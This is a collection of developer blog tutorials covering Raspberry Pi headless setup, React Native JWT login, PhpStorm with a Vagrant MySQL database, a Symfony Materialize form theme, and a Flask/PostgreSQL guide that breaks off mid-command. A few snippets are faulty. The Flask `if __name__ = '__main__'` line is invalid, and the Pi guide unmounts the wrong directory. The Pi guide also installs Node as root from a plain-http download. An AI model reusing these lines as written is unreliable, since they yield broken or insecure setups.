{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA Raspberry Pi is a low cost, small single-board computer.\nIt allows you to develop your own projects and let them run all day on this mini computer.\nPossibilities are endless: home automation, Internet of Things,\nrobotics projects, or run your own router, seedbox, NAS, \u2026\nYou can also use it as inexpensive project server.\nBut let\u2019s start from the beginning!\nIn this article, I will show you how easy it is to install a Raspberry Pi headless\nfrom scratch (meaning that you won\u2019t need another monitor, keyboard,\nmouse than the ones of your computer) so you will \u2018only\u2019 have to type your code\nfrom your pc and launch your server via ssh.\nIf you don\u2019t own a Raspberry Pi yet, maybe I\u2019ll make you want to buy one!\nPrerequisites\nOf course this tutorial require some stuff to work with:\n\nA Raspberry Pi, obviously\nAn ethernet cable\nA battery\nAn SD card\nYour computer\n\nThis can all be bought for around 50-80\u20ac on amazon or thePihut.\nInstall raspbian on your SD card\nAs any computer, your Raspberry Pi will need an operating system to work with.\nFirst, download Raspbian on their official page.\nRaspbian is a free OS based on Debian optimized for the Raspberry Pi architecture.\nIt contains the set of basic programs and utilities that make your Raspberry Pi run.\nPlug your SD card and find the disk where it is mount on your computer with\ndiskutil list with macOS or df -h on Linux.\nUnmount the disk and copy the OS on your SD card.\nFor Mac:\ndiskutil unmountDisk /dev/<disk where your SD card is mounted>\r\n\nor,\u00a0for Linux:\numount /dev/sdd1\r\n\nThen write the image to the card with\nsudo dd bs=1m if=<your .img file> of=/dev/rdisk<disk where your SD card is mount>\r\n\nRaspbian is now your Raspberry Pi new OS!\nRaspberry Pi doesn\u2019t have ssh activated by default.\nYou can (and should) authorize ssh by adding an empty file named ssh at boot directory\ncd <SD card directory> && touch ssh\r\n\nFirst connection\nNow, let\u2019s connect to your Raspberry Pi for the first time.\nFirst, you will need to find your Raspberry Pi ip.\nFind your computer ip address on the network and the subnet mask with\nifconfig | grep 'inet '\r\n\nThis will display your network interfaces ips (which should look like \u2018192.168\u2026..\u2019) and netmasks (for example if your netmask is 0xffffff00 your subnet mask is 24).\nThen find your Raspberry Pi ip\nsudo nmap -sP <Computer IP address>/<Subnet mask> | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'\r\n\nThis will return the ip of your Raspberry Pi by checking all ip addresses of your local network, find the one of your Pi, and print it.\nYou can now connect with ssh to your Pi:\nThe initial user is Pi and the password is raspberry:\nssh pi@<IP>\r\n\nYou can edit your default configuration with raspi-config:\n\nOn your first connection, you should also upgrade your packages with\nsudo apt update\r\nsudo apt dist-upgrade\r\n\nand modify your root password with sudo passwd\nAuthorize your ssh key to connect without password\nIf you don\u2019t want to fill your password each time you connect to your Pi, you can authorize your ssh key.\nFollow this great github tutorial to generate a ssh key if needed.\nThen log to your Pi and create a .ssh directory on your Pi if it doesn\u2019t exist\nsudo su\r\ncd ~\r\ninstall -d -m 700 ~/.ssh\r\ntouch ~/.ssh/authorized_keys\r\n\nThen add your public key (on your computer at ~/.ssh/id_rsa.pub) to your Raspberry Pi at the end of ~/.ssh/authorized_keys\nYour first server on a Raspberry Pi\nIt\u2019s all set!\nNow let\u2019s try your newly configurated Raspberry Pi with a minimal project to see if\neverything works fine.\nLet\u2019s try it with a NodeJS server.\nFirst install NodeJS:\nwget http://node-arm.herokuapp.com/node_latest_armhf.deb\r\nsudo dpkg -i node_latest_armhf.deb\r\n\nCreate a file server.js with those lines\nvar http = require('http');\r\n\r\nvar server = http.createServer(function (request, response) {\r\n  response.writeHead(200, {\"Content-Type\": \"text/plain\"});\r\n  response.end(\"Hello World\\n\");\r\n});\r\n\r\nserver.listen(3000);\r\n\nRun it with node server.js and go to http://\\<IP>:3000/\nYou should be able to access to your first server hosted on a Raspberry Pi on your\nlocal network.\n\nDevelop from your host machine\nIt\u2019s all very nice, but you will obviously not be working in ssh for a substantial project.\nTo work from your computer, you will need to mount your distant directory on your computer.\nLuckily, this can easily be done with SSHFS.\nSSHFS (or Secure shell file system) lets you share a file system securely using\nSSH\u2019s SFTP protocol.\nSSHFS is based on the FUSE file system that allows a user with no privileges to access a file system without having to modify the kernel sources.\nNo more theory, let\u2019s practice.\nFirst, install SSHFS and FUSE (if you use a Mac, go to https://osxfuse.github.io/,\non Ubuntu/Debian sudo apt-get install sshfs).\nThen, create a directory on your computer and mount your Raspberry Pi project\ndirectory on it with SSHFS\nmkdir pi\r\nsshfs root@<IP>:<Path of your project on your Pi> pi\r\ncd pi\r\n\nYou can now access your project directory directly from your computer and modify your files.\nDon\u2019t forget to unmount the project when you are done:\numount tmp\r\n\nConclusion\nYou\u2019ve just learnt how to configure a Raspberry PI from scratch headlessly, if you\u2019re\ninteresting on the project stay tuned for next article about how to use it for home automation !\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGuillaume Renouvin\r\n  \t\t\t\r\n  \t\t\t\tFull Stack developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen developing\u00a0a mobile app, it\u2019s common to have to build an authentication system. However, requiring the users to provide their username and password every time they\u00a0launches the app, severely deteriorates the user experience.\nLately, I have been working on a side project to build a mobile app with React Native and I wanted to implement a persistent user session. So, what I want to share today is how to:\n\nbootstrap an app that works both on Android and iOS platforms (thank you React Native!)\nallow a user to sign up or log in using a JWT authentication process with a backend API\nstore and recover an identity token from the phone\u2019s AsyncStorage\nallow the user to get content from an API\u2019s protected route using the id token\nverify the id token\u2019s existence to create the persistent user session\n\nSetting up the authentication API\nSince building a complete authentication API would take too much time, we\u2019ll use an authentication API sample coded by Auth0. Please refer to the repository\u2019s documentation for more details about the routes we\u2019ll be using as our app\u2019s backend.\nLet\u2019s clone the repo from GitHub and get the API up and running\ngit clone https://github.com/auth0-blog/nodejs-jwt-authentication-sample.git\r\ncd nodejs-jwt-authentication-sample\r\nnpm install\r\nnode server.js\r\n\nDISCLAIMER: It\u2019s worth noting that, for the purpose of this demo, we use http protocol. If you ever ship this code to a production environment, it\u2019s very important to use https for security reasons.\nBootstrap our React Native app\nIn order to keep this article more concise, I\u2019ll assume your React native development environment is already configured. In case you need any help with this, please take a look at this article, written by Gr\u00e9goire Hamaide, in which he explains how to install all you need to get started.\nLet\u2019s build our project:\nreact-native init ReactNativeAuth\r\ncd ReactNativeAuth\r\nreact-native run android\r\n\nOne of the biggest interests of using React Native is writing code that works both on Android and iOS platforms. We\u2019ll create a new directory called app, where a common code will be written and used by both platforms. Inside it, we\u2019ll create an index.js file that will be the entry point to our application:\n// app/index.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Text} from 'react-native';\r\n\r\nclass App extends Component {\r\n  render() {\r\n    return(\r\n      <Text> Hello World! </Text>\r\n    )\r\n  }\r\n}\r\n\r\nexport default App;\r\n\nIn order to redirect both Android and iOS entry points to app/index.js, we have to change both index.android.js and index.ios.js files:\n// index.android.js\r\n\r\nimport {AppRegistry} from 'react-native';\r\nimport App from './app';\r\n\r\nAppRegistry.registerComponent('ReactNativeAuth', () => App);\r\n\r\n\r\n\r\n// index.ios.js\r\n\r\nimport {AppRegistry} from 'react-native';\r\nimport App from './app';\r\n\r\nAppRegistry.registerComponent('ReactNativeAuth', () => App);\r\n\nBuilding the authentication system\nOur example app contains 2 pages:\n\nAn authentication page, where a user will be prompted an username and a password and will be able to either sign up or log in\nA protected homepage, where the user will be able to get protected content from the API or log out.\n\nSetting up the app\u2019s router and scenes\nOne of the most popular routing systems is react-native-router-flux, which is pretty simple to use and will allow us to focus on the authentication process without loosing too much time.\nDiscussing how to use the router is not our goal, so if you\u2019d like to get a better grasp of how to use it, please refer to this article written by Spencer Carli.\nLet\u2019s go and install it:\nyarn install react-native-router-flux\r\n\nWe\u2019ll import Router and Scene from react-native-router-flux package and create the 2 scenes we\u2019ve described earlier, which will be called Authentication and Homepage\n// app/index.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Router, Scene} from 'react-native-router-flux';\r\n\r\nclass App extends Component {\r\n  render() {\r\n    return(\r\n      <Router>\r\n        <Scene key='root'>\r\n          <Scene\r\n            component={Authentication}\r\n            hideNavBar={true}\r\n            initial={true}\r\n            key='Authentication'\r\n            title='Authentication'\r\n          />\r\n          <Scene\r\n            component={HomePage}\r\n            hideNavBar={true}\r\n            key='HomePage'\r\n            title='Home Page'\r\n          />\r\n        </Scene>\r\n      </Router>\r\n    )\r\n  }\r\n}\r\n\r\nexport default App;\r\n\nNow that the router is defined, let\u2019s create both our scenes and test the scene transitions to verify if our Router is working as expected. We\u2019ll start with the Authentication class:\n// app/routes/Authentication.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Text, TextInput, TouchableOpacity, View} from 'react-native';\r\nimport {Actions} from 'react-native-router-flux';\r\nimport styles from './styles';\r\n\r\nclass Authentication extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { username: null, password: null };\r\n  }\r\n\r\n  userSignup() {\r\n    Actions.HomePage();\r\n  }\r\n\r\n  userLogin() {\r\n    Actions.HomePage();\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Text style={styles.title}> Welcome </Text>\r\n\r\n        <View style={styles.form}>\r\n          <TextInput\r\n            editable={true}\r\n            onChangeText={(username) => this.setState({username})}\r\n            placeholder='Username'\r\n            ref='username'\r\n            returnKeyType='next'\r\n            style={styles.inputText}\r\n            value={this.state.username}\r\n          />\r\n\r\n          <TextInput\r\n            editable={true}\r\n            onChangeText={(password) => this.setState({password})}\r\n            placeholder='Password'\r\n            ref='password'\r\n            returnKeyType='next'\r\n            secureTextEntry={true}\r\n            style={styles.inputText}\r\n            value={this.state.password}\r\n          />\r\n\r\n          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogin.bind(this)}>\r\n            <Text style={styles.buttonText}> Log In </Text>\r\n          </TouchableOpacity>\r\n\r\n          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userSignup.bind(this)}>\r\n            <Text style={styles.buttonText}> Sign Up </Text>\r\n          </TouchableOpacity>\r\n        </View>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Authentication;\r\n\nLet\u2019s go through the details of what we just wrote. We have:\n\nan Authentication class with a constructor that sets the initial state with two uninitialized variables: username and password\nthe methods userSignup and userLogin that will be used further on to implement the authentication process. The only thing they do for now is to call the Action method from react-native-router-flux and make a scene to transition to the Homepage scene\na render method, which will display two text inputs (whose values are already bound to our Component\u2019s state) and two buttons, each one bound to the userSignup and userLogin methods.\n\nMoving forward and defining the Homepage class:\n// app/routes/Homepage.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Alert, Image, Text, TouchableOpacity, View} from 'react-native';\r\nimport {Actions} from 'react-native-router-flux';\r\nimport styles from './styles';\r\n\r\nclass HomePage extends Component {\r\n\r\n  getProtectedQuote() {\r\n    Alert.alert('We will print a Chuck Norris quote')\r\n  }\r\n\r\n  userLogout() {\r\n    Actions.Authentication();\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Image source={require('../images/chuck_norris.png')} style={styles.image}/>\r\n\r\n        <TouchableOpacity style={styles.buttonWrapper} onPress={this.getProtectedQuote}>\r\n          <Text style={styles.buttonText}> Get Chuck Norris quote! </Text>\r\n        </TouchableOpacity>\r\n\r\n        <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogout}>\r\n          <Text style={styles.buttonText} > Log out </Text>\r\n        </TouchableOpacity>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nexport default HomePage;\r\n\nAgain, let\u2019s go through the details of what we just wrote. This time, we have:\n\na HomePage class with no constructor defined because our component is stateless\na getProtectedQuote method, that will be responsible for communicating with an API\u2019s protected route to recover a funny Chuck Norris quote. At the moment it just shows an alert popup with a title.\nan userLogout method, that redirects the user to the Authentication scene for now.\na render method, which will display an image and two buttons, each one bound to the getProtectedQuote and userLogout methods\n\nBoth our scenes import basic style properties from an external\u00a0file, which can be seen on our this project\u2019s repository.\nAuthenticating the user\nThe first step is to create a method that will save the received id token from the API in the AsyncStorage, the equivalent of the the browser\u2019s LocalStorage.\nThe reason the token needs to be stored is that we need to be able to recover it every time we have to call a protected API route and later on to create the persistent user session.\n// app/routes/Authentication.js\r\n\r\nimport {AsyncStorage, (...)} from 'react-native'\r\n\r\nclass Authentication extends Component {\r\n  (...)\r\n\r\n  async saveItem(item, selectedValue) {\r\n    try {\r\n      await AsyncStorage.setItem(item, selectedValue);\r\n    } catch (error) {\r\n      console.error('AsyncStorage error: ' + error.message);\r\n    }\r\n  }\r\n\r\n  (...)\r\n}\r\n\r\nexport default Authentication;\r\n\nThis method saves a selectedValue in the AsyncStorage under the key item. Any eventual error is logged to the console.\nWe are now ready to start coding our userSignup method:\n// app/routes/Authentication.js\r\n\r\nuserSignup() {\r\n  if (!this.state.username || !this.state.password) return;\r\n  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n  fetch('http://192.168.XXX.XXX:3001/users', {\r\n    method: 'POST',\r\n    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },\r\n    body: JSON.stringify({\r\n      username: this.state.username,\r\n      password: this.state.password,\r\n    })\r\n  })\r\n  .then((response) => response.json())\r\n  .then((responseData) => {\r\n    this.saveItem('id_token', responseData.id_token),\r\n    Alert.alert( 'Signup Success!', 'Click the button to get a Chuck Norris quote!'),\r\n    Actions.HomePage();\r\n  })\r\n  .done();\r\n}\r\n\nLet\u2019s explain what we\u2019ve just coded:\n\nFirst of all, we verify if the username and password fields have been filled (their initial value is null)\nWe use the Fetch API to make a POST request to our backend API, where the body contains the username and password from the component\u2019s state.\nIf the request succeeds, we store the returned id token in the AsyncStorage under the key id_token. Then we show the user an alert showing the sign-up process succeeded and redirect him/her to the protected scene HomePage.\n\nThe process to make the user login is pretty much the same:\n// app/routes/Authentication.js\r\n\r\nuserLogin() {\r\n  if (!this.state.username || !this.state.password) return;\r\n  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n  fetch('http://192.168.XXX.XXX:3001/sessions/create', {\r\n    method: 'POST',\r\n    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },\r\n    body: JSON.stringify({\r\n      username: this.state.username,\r\n      password: this.state.password,\r\n    })\r\n  })\r\n  .then((response) => response.json())\r\n  .then((responseData) => {\r\n    this.saveItem('id_token', responseData.id_token),\r\n    Alert.alert('Login Success!', 'Click the button to get a Chuck Norris quote!'),\r\n    Actions.HomePage();\r\n  })\r\n  .done();\r\n}\r\n\nThe user may now create an account and log into the application with an id token correctly stored.\nThe next step is to write the userLogout method:\n// app/routes/HomePage.js\r\n\r\nimport {Alert, AsyncStorage, (...)} from 'react-native';\r\n\r\nclass HomePage extends Component {\r\n  (...)\r\n\r\n  async userLogout() {\r\n    try {\r\n      await AsyncStorage.removeItem('id_token');\r\n      Alert.alert('Logout Success!');\r\n      Actions.Authentication();\r\n    } catch (error) {\r\n      console.log('AsyncStorage error: ' + error.message);\r\n    }\r\n  }\r\n\r\n  (...)\r\n}\r\n\nWhat this method does is pretty straightforward. The stored item under the key id_token is removed from the AsyncStorage. Then the user is alerted that the session is over and he/she is redirected to the Authentication scene.\nGetting data from the protected API\u2019s route\nThe next step is to make use of the id token stored in the AsyncStorage to get protected content from the API. The token should be sent on the request\u2019s authorization header so that the API may verify the user\u2019s identify and return the content if authorized\n// app/routes/HomePage.js\r\n\r\ngetProtectedQuote() {\r\n  AsyncStorage.getItem('id_token').then((token) => {\r\n    // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n    fetch('http://192.168.XXX.XXX:3001/api/protected/random-quote', {\r\n      method: 'GET',\r\n      headers: { 'Authorization': 'Bearer ' + token }\r\n    })\r\n    .then((response) => response.text())\r\n    .then((quote) => {\r\n      Alert.alert('Chuck Norris Quote', quote)\r\n    })\r\n    .done();\r\n  })\r\n}\r\n\nCreating a persistent user session\nAs of this moment, our application is completely functional! It\u2019s capable of performing the three basic authentication operations (sign-up, login, and log out) and using the user\u2019s identifier to get protected content from the API.\nHowever, there\u2019s still a problem to solve: every time the user closes the app and restarts it, he/she\u2019s required to go through the authentication process again.\nThe desired behavior is that, at the application launch, the existence of a token in the AsyncStorage is verified and dynamically change the initial parameter on our Router\u2018s scenes. The home page should be the initial scene if the user has a token. Otherwise, it should be the authentication scene.\nIf we look at a React component\u2019s lifecycle documentation, the method componentWillMount is called before the render method. If the existence of the token could be verified and the state set before the component is rendered, the problem would be solved, right? Wrong!\nLet\u2019s write the code for what we just said and then we\u2019ll discuss why it doesn\u2019t work:\n// app/index.js\r\n\r\nimport {AsyncStorage} from 'react-native';\r\n\r\nclass App extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { hasToken: false };\r\n  }\r\n\r\n  componentWillMount() {\r\n    AsyncStorage.getItem('id_token').then((token) => {\r\n      this.setState({ hasToken: token !== null })\r\n    })\r\n  }\r\n\r\n  render() {\r\n    return(\r\n      <Router>\r\n        <Scene key='root'>\r\n          <Scene\r\n            component={Authentication}\r\n            initial={!this.state.hasToken}\r\n            (...)\r\n          />\r\n          <Scene\r\n            component={HomePage}\r\n            initial={this.state.hasToken}\r\n            (...)\r\n          />\r\n        </Scene>\r\n      </Router>\r\n    )\r\n  }\r\n}\r\n\nThere are three reasons why this approach doesn\u2019t work:\n\nthe access to the AsyncStorage is asynchronous, so the render method is executed before the state is set\nthe componentWillMount method doesn\u2019t trigger a re-rendering if the state changes\neven if the component re-rendered, once the Router is instantiated, the initial property will not be updated\n\nThus we must find a way to wait for the token\u2019s existence verification to finish before returning the Router on the render method.\nTo solve this problem, a loader will be returned by default on the render method. Once the token verification is finished, a 2nd state variable isLoaded will tell the render method to return the Router with the calculated value for the initial scene:\n// app/index.js\r\n\r\nimport {ActivityIndicator, AsyncStorage} from 'react-native';\r\n\r\nclass App extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { hasToken: false, isLoaded: false };\r\n  }\r\n\r\n  componentDidMount() {\r\n    AsyncStorage.getItem('id_token').then((token) => {\r\n      this.setState({ hasToken: token !== null, isLoaded: true })\r\n    });\r\n  }\r\n\r\n  render() {\r\n    if (!this.state.isLoaded) {\r\n      return (\r\n        <ActivityIndicator />\r\n      )\r\n    } else {\r\n      return(\r\n        <Router>\r\n          <Scene key='root'>\r\n            <Scene\r\n              component={Authentication}\r\n              initial={!this.state.hasToken}\r\n              (...)\r\n            />\r\n            <Scene\r\n              component={HomePage}\r\n              initial={this.state.hasToken}\r\n              (...)\r\n            />\r\n            </Scene>\r\n        </Router>\r\n      )\r\n    }\r\n  }\r\n}\r\n\nConclusion\nIn this article we\u2019ve seen how to:\n\nshare a common codebase to build our Android and iOS apps;\nset up routes and scenes with react-native-router-flux;\ncommunicate to an API to set up a simple JWT authentication system;\nsave and retrieve elements from the AsyncStorage;\ncreate a persistent user session *\n\n* It\u2019s worth noting that a new authentication will be required once the token expires because there is no token renewal method.\nIf you have any questions or comments, please drop a line in the comments area below and I\u2019ll be glad to answer!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFernando Beck\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWhy should I care?\nHow many hours have you spent logged on your Vagrant trying to type your query, copying in a text editor, pasting, then raging because the console goes crazy and you have to start all over again?\nWell, spend five minutes to follow the next steps and see the pain of manipulating your data disappear!\nStep 1:\nOpen your project in PhpStorm and open the DataSource window:\n\nClick on View -> Tool Windows -> Database\nClick on the Database sidebar, click on new -> Datasource -> MySQL\nThe configuration window will appear\n\nStep 2: configure the ssh tunnel\n\nOpen your terminal.\ncd ~/path/to/your/project\nDisplay the configuration of your ssh connection with the command vagrant ssh-config\nOn the configuration window, click on the SSH/SSL tab\nReport the host, user and port\nChoose the Auth Type \u201cKey pair (OpenSSH)\u201d and report the path of the IdentityFile\n\n\nClick on the apply and then click on Test Connection, you should see an error message saying you\u2019ve got the wrong user/password combination\nStep 3: Set up the database configuration\n\nIn PhpStorm :\nClick on the General tab of the configuration of your datasource\nFill the credentials, host and port. If you\u2019re using Symfony, you can find it in the parameters.yml file.\nClick on Apply\nFinally, click on Test Connection\n\nCase 1 -> It works! congratulations you can now manipulate your DB from within your IDE\nCase 2 -> You get a wrong user/password combination error. Don\u2019t panic! just do the following:\n\nSSH into your Vagrant: vagrant ssh\nChange to root user sudo su\nLog as root user to your MySQL DB: mysql -uroot\nRun the following queries (don\u2019t forget to replace yourdatabase, youruser and your_password):\nGRANT ALL PRIVILEGES ON your_database.* TO 'your_user'@'127.0.0.1' identified by 'your_password';\nFLUSH PRIVILEGES;\nYou now have granted your user to login to using the host \u201c127.0.0.1\u201d\nYou can now go to PhpStorm and test your connection again and it should work!\n\nA few use examples:\n\nExplore the schema of your tables on the sidebar\nOpen the console file and enjoy:\n\nthe autocomplete\nthe syntactic correction and coloration\nwrite multiple queries and execute the one you want (Ctrl + Enter)\npaginated scrollable results\nexecute multiple queries at the same time, \n\n\nUpdate or add data to your database from the graphical interface.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tQuentin Febvre\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou want to make a nice, elegant and modern form using the new design standards of Material Design, I\u2019ll try to give you a 5-minutes way to do so with Materialize, a JQuery library, based on these guidelines.\nGet Started\nGet the assets from Materialize\u00a0and add it in web directory of your project following Symfony best practices\u00a0: in fonts, Roboto, in CSS, materialize.min.css, in JS, materialize.min.js.\u00a0Prefer minified version to improve loading performance.\nRun assets:install command.\nImport\u00a0assets in your project templates\nYou need to import assets into your Twig. At the beginning of your base.html:\n{% block stylesheets %}\r\n  <link href=\"{{ asset('css/materialize.css') }}\" rel=\"stylesheet\"/>\r\n  <link href=\"{{ asset('css/your_form_theme.css') }}\" rel=\"stylesheet\"/>\r\n{% endblock %}\nAt the end of your\u00a0base.html\n{% block javascripts %}\r\n  <script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-2.1.1.min.js\"></script>\r\n  <script type=\"text/javascript\" src=\"{{ asset('js/materialize.min.js') }}\"></script>\r\n{% endblock %}\nYou need JQuery and materialize.min.js if you use Materialize Javascripts animations .\nCreate your Materialize form theme\nSymfony use form themes to standardize display from components\nYou need to create your Materialize form theme to transform your form design from a basic to an elegant one. You can use this Gist I created for you. You need to create it into app/Ressources/views folder. Once it\u2019s done, update your Twig configuration in app/config/config.yml:\ntwig:\r\n  form_themes:\r\n  - 'views/materialize_layout.html.twig'\nAnd that\u2019s it! You have built an elegant, modern and responsive form with very nice TextInputs, DatePicker or\u00a0SelectList.\n\nI look forward to reading\u00a0your feedbacks and your suggestions or issues on the form theme repository.\nTips\nYou can update primary, secondary and background colors to adapt your form to your own visual identity by editing _variables.scss file in components folder. You\u2019ll need Gulp to compile and minify CSS files.\nUse grids of Materialize\u00a0to display multiple fields on the same row depending on device width.\nIf you want to customise a specific form instead of all the forms of your app, follow the Symfony documentation and import your new form theme by adding this line at the beginning of the corresponding template:\n{% form_theme form 'materialize_layout.html.twig'}\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Boutin\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI have lately been attempting to develop a web app linked to a PostgreSQL database and despite all the tutorials available through the Internet, it has not been an easy task. So I have decided to gather all the sources or tips I have used to solve the errors I encountered and to provide with a boilerplate to help setting up a Flask app.\nThe objective of this post is to make it easier and faster for people to start using Flask and PostgreSQL.\nIf you have encountered any error in a related project please comment about it and explain how you solved it or provide any source that helped you.\nBy the end of this article you will, first, know that you are not alone encountering errors, second, find some answers to help you.\nSystem\nThe code snippets have been tested with the following versions:\n\nFlask 0.12\nPostgreSQL 9.5\nPython 2.7\nUbuntu 16.04\n\nPlease consider that when you reuse them.\nWhat is needed to build the app?\nFlask is a Python web developpement framework to build web applications. It comes with jinja2, a templating language for Python, and Werkzeug, a WSGI utility module.\nPostgreSQL is an open source relational database system which, as its name suggests,\nuses SQL.\nSQLAlchemy is an Object Relational Mapper (ORM), it is a layer between\nobject oriented Python and the database schema of Postgres.\nAlembic is a useful module to manage migrations with SQLAlchemy in Python. Migrations occur when one wants to change the database schema linked to the application, like adding a table or removing a column from a table. It can also be used to write or delete data in a table. Alembic enables developers not to manually upgrade their database and to easily revert any change: migrations go up and down. It is also useful to recreate databases from scratch, by following the migration flow.\nEven if you don\u2019t use them directly, you will have to install libpq-dev, to communicate with Postgres backend, and psycopg2, a libpq wrapper in Python.\nSo many things, but how to use each of them?\nNow, let\u2019s see how to connect the previous modules and software together. The good news is that almost everything is managed by itself.\n\n\nCreate an app.py file which will define and run the application. It is the entry point of the application. With Flask, it is as easy as importing the Flask class and initialize an instance with:\napp = Flask(__name__)\r\n\n\n\nAdd:\nif __name__ = '__main__':\r\n    app.run()\r\n\nin app.py file and then enter python app.py in a terminal to get your app running. Easy, but it does not do many things yet\u2026\n\n\nSo far, if you want something else than an error 404 when accessing the application, create the first route which will return Hello World! at the root of the application. To do so, add the following piece of code after the definition of the application instance.\n@app.route('/')\r\ndef main():\r\n    return 'Hello World!'\r\n\n\n\nSet the application in debug mode so that the server is reloaded on any code change and provides detailed error messages, otherwise it should be restarted manually. In app.py, before app.run():\napp.config['DEBUG'] = True\r\n\n\n\nInitialize a database object from Flask-Alchemy with db = SQLAlchemy() to control the SQLAlchemy integration to the Flask applications. You might put it directly in the app.py or in another file usually called models.py.\nfrom flask_sqlalchemy import SQLAlchemy\r\n\r\ndb = SQLAlchemy()\r\n\r\n# define your models classes hereafter\r\n\n\n\nConfigure Flask by providing the PostgreSQL URI so that the app is able to connect to the database, through : app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://DB_USER:PASSWORD@HOST/DATABASE' where you have to replace all the parameters in capital letters (after postgresq://). Find out more on URI definition for PostgreSQL here.\nBack in app.py:\nPOSTGRES = {\r\n    'user': 'postgres',\r\n    'pw': 'password',\r\n    'db': 'my_database',\r\n    'host': 'localhost',\r\n    'port': '5432',\r\n}\r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\\\r\n%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES\r\n\n\n\nYou also have to connect your SQLAlchemy object to your application with db.init_app(app),\nto make sure that connections will not leak. To do so, you first have to import db in app.py.\nfrom models import db\r\n\r\n# ...app config...\r\ndb.init_app(app)\r\n\n\n\nYour models.py file should include the definition of classes which define the models of your database tables. Such classes inherit from the class db.Model where db is your SQLAlchemy object. Further, you may want to define models implementing custom methods, like an home-made __repr__ or a json method to format objects or export it to json. It could be helpful to define a base model which will lay the ground for all your other models:\nclass BaseModel(db.Model):\r\n\"\"\"Base data model for all objects\"\"\"\r\n__abstract__ = True\r\n    # define here __repr__ and json methods or any common method\r\n    # that you need for all your models\r\n\r\nclass YourModel(BaseModel):\r\n\"\"\"model for one of your table\"\"\"\r\n    __tablename__ = 'my_table'\r\n    # define your model\r\n\n\n\nFinally, you have to add a manage.py file to run database migrations and upgrades using flask_script and flask_migrate modules with:\nfrom flask_script import Manager\r\nfrom flask_migrate import Migrate, MigrateCommand\r\nfrom app import app, db\r\n\r\n\r\nmanager = Manager(app)\r\nmigrate = Migrate(app, db)\r\n\r\nmanager.add_command('db', MigrateCommand)\r\n\n\n\n\nYou want to be abble to run the migrations command from the manager, these last lines are needed in manage.py:\nif __name__ == '__main__':\r\n    manager.run()\r\n\n\n\nInstalling PostgreSQL & code samples\nInstall Postgres and other requirements.\nsudo apt-get update\r\nsudo apt-get install postgresql postgresql-contrib libpq-dev\r\npip install psycopg2 Flask-SQLAlchemy Flask-Migrate\r\n\nOptionnaly, if you want to modify some parameters in postgres, like the password of the user:\nsudo -i -u postgres psql\r\npostgres=# ALTER 